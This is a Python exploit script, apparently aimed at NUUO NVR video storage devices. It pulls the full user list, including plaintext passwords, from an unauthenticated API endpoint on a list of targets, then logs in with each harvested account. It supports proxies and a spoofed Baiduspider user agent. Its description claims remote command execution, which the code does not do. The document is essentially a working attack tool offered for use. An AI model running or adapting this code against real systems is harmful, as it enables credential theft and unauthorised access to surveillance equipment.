import argparse
import os
import random

import requests
import json
from user_agent import get_user_agent_pc

page_index = 0
page_size = 10

proxies = None
headers = None
timeout = None
delay = None
thread = None


# 1. 获取 api 数据
# 1.1 构造 payload 获取相关 API 数据
def create_api_path(index: int = page_index, size: int = page_size) -> str:
    index = page_index if index is None or index < 0 else index
    size = page_size if size is None or size < 0 else size
    payload = "/api/v1/userlist?pageindex={}&pagesize={}"
    payload = payload.format(index, size)
    return payload


# 1.2 获取 html response 数据
def get_html_content(url: str, charset: str = "UTF-8") -> tuple:
    global proxies, headers, timeout
    try:
        res = requests.get(url=url, headers=headers, proxies=proxies, timeout=timeout)
        encode = res.encoding
        if encode is None or not encode:
            encode = charset
        content = res.content.decode(encode)
        if content is None or not content:
            return 404, f"[!] {url} 并未获取到相关数据"
        if not isinstance(content, str):
            return 501, f"[!] {url} 获取数据格式错误"
        return 200, content
    except Exception as e:
        return 500, f"[-]访问 {url} 过程中出现意料之外的错误"


# 1.3 通过 API 获取所有用户数据
def total_api_user(url: str, charset: str = "UTF-8", index: int = page_index, size: int = page_size) -> tuple:
    api_url = create_api_path(index, size)
    code, content = get_html_content(url + api_url, charset=charset)

    if code != 200:
        return code, content

    content = json.loads(content)
    count = content.get('count', 0)
    if count == 0:
        return 404, f"[!] {url + api_url} 并未获取到相关数据"

    res = list()
    need_index = int(count // size - 1) + 1
    for page_index_num in range(need_index):
        api_url = create_api_path(page_index_num, size)
        part_code, part_content = get_html_content(url + api_url, charset=charset)
        if part_code != 200:
            return part_code, part_content
        part_content = json.loads(part_content)
        part_content_data = part_content.get("data", None)

        if part_content_data is None or not part_content_data:
            return 404, f"[!] {url + api_url} 并未获取到相关数据"
        res = res + part_content_data
    return 200, res


# 2 用户登录
# 2.1 构造 payload 获取登录 ip
def create_login_path(username: str, password: str) -> tuple:
    if username is None or password is None:
        return 500, "用户名或密码异常"
    if not username or not password:
        return 500, "用户名或密码为空"

    payload = "/api/v1/login?_t=1697188106&username={}&password={}"
    payload = payload.format(username, password)
    return 200, payload


# 2.2 尝试登录
def try_to_login(url: str, username: str, password: str, charset: str = "UTF-8") -> tuple:
    global proxies, headers, timeout

    code, mes = create_login_path(username, password)
    if code != 200:
        return code, mes

    try:
        res = requests.get(url=url + mes, headers=headers, proxies=proxies, timeout=timeout)
        encode = res.encoding
        if encode is None or not encode:
            encode = charset
        content = res.content.decode(encode)
        if content is None or not content:
            return 500, f"使用用户名/密码：{username}/{password} 登录 {url + mes} 可能失败"
        if not isinstance(content, str):
            return 500, f"使用用户名/密码：{username}/{password} 登录 {url + mes} 过中出现非法内容"
        content = json.loads(content)
        if not isinstance(content, dict):
            return 500, f"使用用户名/密码：{username}/{password} 登录 {url + mes} 过中出现非法内容"
        content.setdefault("login_message", {
            "username": username,
            "password": password
        })
        return 200, content
    except json.decoder.JSONDecodeError as l_e:
        return 403, f"使用用户名/密码：{username}/{password} 登录 {url + mes} 失败"
    except Exception as e:
        return 500, f"使用用户名/密码：{username}/{password} 登录 {url + mes} 过中出现异常"


def get_data_from_file(filename: str, mode: str) -> tuple:
    if not os.path.isabs(filename):
        filename = os.path.abspath(os.path.join(os.getcwd(), filename))
    if not os.path.isfile(filename):
        return "405", "{}不是一个合法文件".format(filename)
    if not os.path.exists(filename):
        return "404", "无法找到{}文件".format(filename)
    try:
        content = None
        with open(filename, mode=mode) as f:
            content = f.read().split()
        return "200", content
    except Exception as e:
        return "500", "打开{}文件时发生意料之外的错误".format(filename)


def get_data_brute_list(url_dict: dict) -> dict:
    brute_list = {
        'url': None
    }

    for key, value in url_dict.items():
        _type = value.get("type")
        if _type is None or not _type:
            continue
        if _type == "file":
            _value = value.get("value")
            code, res = get_data_from_file(_value, mode="r")
            if code != "200":
                print(res)
                continue
            brute_list[key] = res
        else:
            brute_list[key] = [value.get('value', None), ]

    return brute_list


def task(url_dict: dict) -> None:
    global proxies, headers, timeout, delay, thread
    brute_list = get_data_brute_list(url_dict)
    urls = brute_list.get('url', None)
    options = brute_list.get('options', None)[0]

    proxy = options.get('proxy', None)
    if proxy is None or not proxy:
        proxy = None
    else:
        os.environ['http_proxy'] = proxy

    proxies = {
        'http': proxy
    }

    headers = {
        "User-Agent": options.get('user_agent', None)
    }

    timeout = options.get('time_out', None)
    delay = options.get('delay', None)
    thread = options.get('thread', None)

    for url in urls:
        url = url[:-1] if url.endswith("/") else url
        code, mes = total_api_user(url=url, index=1, size=1)
        if code != 200:
            continue
        for user_data_dict in mes:
            username = user_data_dict.get("Name")
            password = user_data_dict.get("Password")
            code, msg = try_to_login(url, username, password)
            print("="*100, "\nhttp status:{} message:{}".format(code, msg))


def set_cmd_arg() -> any:
    description = 'NUUO NVR Video Storage Management Device Remote Command Execution'

    parser = argparse.ArgumentParser(description=description, add_help=True)

    targets = parser.add_mutually_exclusive_group(required=True)
    targets.add_argument('-u', '--url', type=str, help='Enter target object')
    targets.add_argument("-f", '--file', type=str, help='Input target object file')

    parser.add_argument('--random-agent', type=bool,
                        required=False, help='Using random user agents')
    parser.add_argument('--time-out', type=int,
                        required=False, help='Set the HTTP access timeout range (setting range from 0 to 5)')
    parser.add_argument('-d', '--delay', type=int,
                        required=False, help='Set multi threaded access latency (setting range from 0 to 5)')
    parser.add_argument('-t', '--thread', type=int,
                        required=False, help='Set the number of program threads (setting range from 1 to 50)')
    parser.add_argument('--proxy', type=str,
                        required=False, help='Set up HTTP proxy')

    args = parser.parse_args()
    return args


def parse_cmd_args(args) -> dict:
    o = dict()
    if args.url is None or not args.url:
        o.setdefault('url', {'type': 'file', 'value': args.file})
    else:
        o.setdefault('url', {'type': 'str', 'value': args.url})

    options = dict()
    if args.random_agent is not None and  args.random_agent:
        user_agent = get_user_agent_pc()
    else:
        user_agent = "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
    options.setdefault('user_agent', user_agent)

    time_out = 1
    base_time_out = random.randint(1, 5)
    if args.time_out is not None:
        if args.time_out < 0 or args.time_out > 5:
            time_out = 0
        else:
            time_out = args.time_out
    options.setdefault('time_out', (base_time_out, base_time_out + time_out))

    options.setdefault('delay', args.delay if args.delay is not None else 0)
    options.setdefault('thread', args.delay if args.thread is not None else 0)
    options.setdefault('proxy', args.proxy if args.proxy is not None else None)

    o.setdefault('options', {"type": "str", "value": options})

    return o


def main() -> None:
    args = set_cmd_arg()
    obj = parse_cmd_args(args)
    task(obj)


if __name__ == '__main__':
    main()
